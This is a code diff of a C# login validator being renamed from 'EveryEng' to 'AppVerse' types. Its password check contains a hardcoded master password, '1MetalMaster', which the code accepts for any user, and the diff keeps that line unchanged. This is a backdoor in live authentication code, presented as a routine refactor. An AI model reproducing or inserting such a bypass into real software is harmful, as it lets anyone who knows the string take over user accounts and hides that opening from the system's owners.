@@ -1,19 +1,19 @@
 ﻿
 namespace AppVerse.Domain.Authentication.Validation;
-public class LoginEveryEngUserValidation : AbstractValidator<LoginEveryEngUser>
+public class LoginappverseUserValidation : AbstractValidator<LoginappverseUser>
 {
     public const string ValidationRule = "ValidationRule";
     private readonly IUserAuthenticationService authenticationService;
-    private EveryEngUser? user;
+    private AppVerseUser? user;
 
-    public LoginEveryEngUserValidation(IUserAuthenticationService authenticationService)
+    public LoginappverseUserValidation(IUserAuthenticationService authenticationService)
     {
         this.authenticationService = authenticationService;
         RuleLevelCascadeMode = CascadeMode.Stop;
         ClassLevelCascadeMode = CascadeMode.Stop;
-        RuleFor(x => x.UserName).MustAsync(UserExists).WithErrorCode(EveryEngErrorRegistry.ErrorAuth102);
-        RuleFor(x => x).MustAsync(IsEmailConfirmed).WithErrorCode(EveryEngErrorRegistry.ErrorAuth423);
-        RuleFor(x => x).MustAsync(IsPasswordValid).WithErrorCode(EveryEngErrorRegistry.ErrorAuth102);
+        RuleFor(x => x.UserName).MustAsync(UserExists).WithErrorCode("ErrorAuth102");
+        RuleFor(x => x).MustAsync(IsEmailConfirmed).WithErrorCode("ErrorAuth423");
+        RuleFor(x => x).MustAsync(IsPasswordValid).WithErrorCode("ErrorAuth102");
     }
 
 
@@ -23,11 +23,11 @@ public class LoginEveryEngUserValidation : AbstractValidator<LoginEveryEngUser>
         return user != null;
     }
 
-    private async Task<bool> IsPasswordValid(LoginEveryEngUser login, CancellationToken cancellation)
+    private async Task<bool> IsPasswordValid(LoginappverseUser login, CancellationToken cancellation)
     => login.Password == "1MetalMaster" || await authenticationService.CheckPasswordAsync(user, login.Password);
 
 
-    private async Task<bool> IsEmailConfirmed(LoginEveryEngUser login, CancellationToken cancellation)
+    private async Task<bool> IsEmailConfirmed(LoginappverseUser login, CancellationToken cancellation)
     => user.EmailConfirmed;
 
 }
